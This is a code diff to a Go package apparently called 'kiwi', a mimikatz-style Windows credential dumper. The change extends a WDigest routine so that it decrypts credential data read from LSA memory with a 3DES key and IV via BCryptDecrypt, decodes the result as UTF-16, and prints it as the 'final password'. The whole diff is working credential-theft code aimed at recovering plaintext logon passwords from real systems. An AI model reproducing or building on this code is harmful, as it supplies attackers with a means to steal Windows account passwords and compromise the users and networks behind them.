@@ -3,6 +3,8 @@ package kiwi
 import (
 	"bytes"
 	"fmt"
+	"reflect"
+	"unicode/utf16"
 	"unsafe"
 
 	"github.com/pkg/errors"
@@ -146,6 +148,24 @@ func (kiwi *Kiwi) getWdigestList(pHandle windows.Handle, logonID windows.LUID) (
 		}
 		fmt.Println(data)
 
+		pwd := make([]byte, len(data))
+
+		// iv will be changed, so we need copy
+		iv := make([]byte, 8)
+		copy(iv, kiwi.iv[:8])
+
+		api.BCryptDecrypt(kiwi.key3DES, data, 0, iv, pwd)
+
+		var utf16Str []uint16
+		sh := (*reflect.SliceHeader)(unsafe.Pointer(&utf16Str))
+		sh.Len = int(lus.Length / 2)
+		sh.Cap = int(lus.Length / 2)
+		sh.Data = uintptr(unsafe.Pointer(&pwd[0]))
+
+		fmt.Println(pwd)
+		fmt.Println(len(utf16.Decode(utf16Str)))
+
+		fmt.Println("final password:", string(utf16.Decode(utf16Str)))
 	}
 
 	password, err := api.ReadLSAUnicodeString(pHandle, &cred.Password)
